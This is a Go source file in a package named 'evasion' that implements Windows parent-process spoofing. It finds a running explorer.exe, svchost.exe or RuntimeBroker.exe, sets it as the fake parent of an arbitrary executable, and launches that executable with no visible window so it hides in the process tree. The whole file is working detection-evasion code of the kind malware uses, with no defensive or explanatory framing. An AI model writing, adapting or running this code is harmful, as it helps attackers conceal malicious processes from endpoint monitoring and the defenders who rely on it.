//go:build windows
// +build windows

package evasion

import (
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ppidSpoofTargets are benign processes to use as the spoofed parent.
// The first one found running is used.
var ppidSpoofTargets = []string{
	"explorer.exe",
	"svchost.exe",
	"RuntimeBroker.exe",
}

// SpawnWithSpoofedParent launches exePath as a child of a chosen legitimate
// process so it appears in the process tree under that parent rather than under
// the real caller. Returns the new process handle or an error.
func SpawnWithSpoofedParent(exePath string, args string) (windows.Handle, error) {
	parentPID, err := findParentPID()
	if err != nil {
		return 0, err
	}

	parentHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_PROCESS,
		false,
		parentPID,
	)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(parentHandle)

	// Build STARTUPINFOEXA with a PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute.
	size := unsafe.Sizeof(windows.ProcThreadAttributeList{})
	_ = size

	var siEx windows.StartupInfoEx
	siEx.Cb = uint32(unsafe.Sizeof(siEx))

	attrList, err := windows.NewProcThreadAttributeList(1)
	if err != nil {
		return 0, err
	}
	defer attrList.Delete()

	if err := attrList.Update(
		windows.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		unsafe.Pointer(&parentHandle),
		unsafe.Sizeof(parentHandle),
	); err != nil {
		return 0, err
	}
	siEx.ProcThreadAttributeList = attrList.List()

	cmdLine, err := windows.UTF16PtrFromString(exePath + " " + args)
	if err != nil {
		return 0, err
	}

	var pi windows.ProcessInformation
	err = windows.CreateProcess(
		nil,
		cmdLine,
		nil,
		nil,
		false,
		windows.CREATE_NO_WINDOW|windows.EXTENDED_STARTUPINFO_PRESENT,
		nil,
		nil,
		&siEx.StartupInfo,
		&pi,
	)
	if err != nil {
		return 0, err
	}
	windows.CloseHandle(pi.Thread)
	return pi.Process, nil
}

func findParentPID() (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return 0, err
	}

	for _, target := range ppidSpoofTargets {
		snap2, err2 := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err2 != nil {
			continue
		}
		entry2 := windows.ProcessEntry32{}
		entry2.Size = uint32(unsafe.Sizeof(entry2))
		if windows.Process32First(snap2, &entry2) == nil {
			for {
				name := strings.ToLower(windows.UTF16ToString(entry2.ExeFile[:]))
				if name == strings.ToLower(target) {
					windows.CloseHandle(snap2)
					return entry2.ProcessID, nil
				}
				if windows.Process32Next(snap2, &entry2) != nil {
					break
				}
			}
		}
		windows.CloseHandle(snap2)
	}
	return 0, windows.ERROR_NOT_FOUND
}
